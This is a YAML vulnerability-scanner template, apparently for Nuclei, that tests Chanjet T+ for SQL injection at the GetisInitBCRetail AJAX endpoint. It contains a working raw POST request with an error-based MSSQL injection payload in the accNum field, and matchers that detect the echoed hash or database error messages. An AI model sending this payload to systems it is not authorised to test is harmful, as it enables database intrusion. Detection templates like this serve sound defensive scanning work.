id: poc-yaml-changjie-t-plus-getisinitbcretail-php-sqli
info:
  name: 畅捷通T+ GetisInitBCRetail SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    product: 畅捷通CRM

variables:
  t1: "{{rand_int(1000, 100000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"accNum":"1' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5', CAST('{{t1}}' AS VARCHAR))))) AND 'rhYc'='rhYc"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "DatabaseException"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
